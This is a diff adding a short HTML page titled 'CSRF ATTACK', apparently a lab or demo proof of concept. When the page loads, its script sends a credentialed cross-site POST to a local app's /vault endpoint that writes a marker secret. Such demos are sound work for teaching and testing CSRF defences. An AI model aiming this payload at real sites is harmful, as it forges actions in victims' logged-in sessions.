@@ -1,0 +1,17 @@
+<!doctype html>
+<head>
+  <title>CSRF ATTACK</title>
+</head>
+
+<script>
+  const formData = new FormData();
+  const url = "http://localhost:3000/vault";
+
+  formData.append("secret", "CSRF executed");
+  fetch(url, {
+    method: "POST",
+    credentials: "include",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: "secret=CSRF executed",
+  });
+</script>
